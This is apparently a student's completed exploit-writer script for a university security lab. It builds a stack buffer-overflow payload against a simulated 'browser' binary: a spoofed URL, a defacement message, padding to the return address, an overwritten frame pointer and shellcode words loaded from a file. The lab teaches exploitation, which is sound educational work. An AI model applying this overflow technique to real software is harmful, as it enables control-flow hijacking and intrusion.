# !!!!!!! IMPORTANT; PLZ READ !!!!!!!
# We strongly encourage you to develop your exploit in here
# since it will alleviate many potential headaches that come with
# processing raw bytes of data.
#
# Try running this program using python3. It will create a file called exploit.bin:
#   $ python3 exploit_writer.py
# and then inspect the output of the generated file using xxd:
#   $ xxd exploit.bin
# You can then run the browser binary with your exploit like so:
#   $ simulate -i <path to exploit.bin> browser
#
# You can submit a well commented version of this file as your writeup

import struct

def pack_word(p):
    '''
    pack_word(p) will treat the input [p] like a 32 bit little endian
    integer. This means that calling:
    >>> pack(0x1a2b3c4d)
    [0x4d, 0x3c, 0x2b, 0x1a]
    '''
    return struct.pack('<I', p)

def pack_str(s):
    '''
    pack_str(s) will return bytes represeting the string. For example:
    >>> pack_str("abcd")
    [0x61, 0x62, 0x63, 0x64]
    '''
    return s.encode('utf-8')

def pack_byte(b):
    '''
    pack_byte(b) will return bytes representing the individual byte.
    This can then be concatenated with other bytes.
    >>> pack_byte(0x40)
    [0x40]
    '''
    return bytes([b])

# Develop your exploit by setting the payload variable.
# Note that the payload variable is of type bytes, so you can't
# just concatenate strings to it. Instead, you can use the pack_str
# method to convert a string to bytes and concatenate that with the payload.

# Example:

# this will add the bytes representing the characters 'a', 'b', 'c', and 'd'
# to the payload in that order.

# portion of payload that makes browser think the correct user input is given
# the \0 following .edu ensures that the program thinks the input is finished
payload = pack_str("www.cs.cornell.edu\0 ") 

# this is the message that is to be displayed. again the \0\0 ensures that no 
# extraneous information is being passed on
payload += pack_str("LOL 0wn3d! efg37 is on google.com!\0\0")

# this is padding that is added after the message to make sure that the
# beginning of my instructions starts at the return address
payload += pack_str("123456789012")

# this is the address where I want the frame pointer to go to
payload += pack_word(0x7ae2b488)

with open("insns.hex", "r") as f:
    for line in f:
        payload += pack_word(int(line.strip(), 16))

# To inspect the actual bytes in exploit.bin, run:
#   xxd exploit.bin
with open("exploit.bin", "wb+") as f:
    f.write(payload)
